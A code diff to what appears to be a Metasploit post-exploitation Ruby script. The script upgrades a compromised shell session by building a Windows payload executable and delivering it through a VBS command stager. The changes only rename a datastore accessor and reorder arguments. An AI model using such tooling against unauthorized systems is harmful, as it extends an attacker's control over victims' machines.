@@ -24,17 +24,17 @@ raise RuntimeError, "You must select a session." if (not session)
 raise RuntimeError, "Selected session is not a command shell session!" if (session.type != "shell")
 
 # Check for required datastore options
-if (not session.exploit_datastore['LHOST'] or not session.exploit_datastore['LPORT'])
+if (not session.exploit_data_store['LHOST'] or not session.exploit_data_store['LPORT'])
 	raise RuntimeError, "You must set LPORT and LHOST for this script to work."
 end
 
 
-lhost = session.exploit_datastore['LHOST']
-lport = session.exploit_datastore['LPORT']
+lhost = session.exploit_data_store['LHOST']
+lport = session.exploit_data_store['LPORT']
 
 # maybe we want our sessions going to another instance?
 use_handler = true
-use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)
+use_handler = nil if (session.exploit_data_store['DisablePayloadHandler'] == true)
 
 # Process special var/val pairs...
 # XXX: Not supported yet...
@@ -82,15 +82,20 @@ begin
 	lplat = [Msf::Platform::Windows]
 	larch = [ARCH_X86]
 	linemax = 1700
-	if (session.exploit_datastore['LineMax'])
-		linemax = session.exploit_datastore['LineMax'].to_i
+	if (session.exploit_data_store['LineMax'])
+		linemax = session.exploit_data_store['LineMax'].to_i
 	end
 	opts = {
 		:linemax => linemax,
 		:decoder => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64"),
 		#:nodelete => true # keep temp files (for debugging)
 	}
-	exe = Msf::Util::EXE.to_executable(framework, larch, lplat, buf)
+	exe = Msf::Util::EXE.to_executable(
+      architecture_abbreviations: larch,
+      code: buf,
+      framework: framework,
+      platforms: lplat
+  )
 
 
 	#
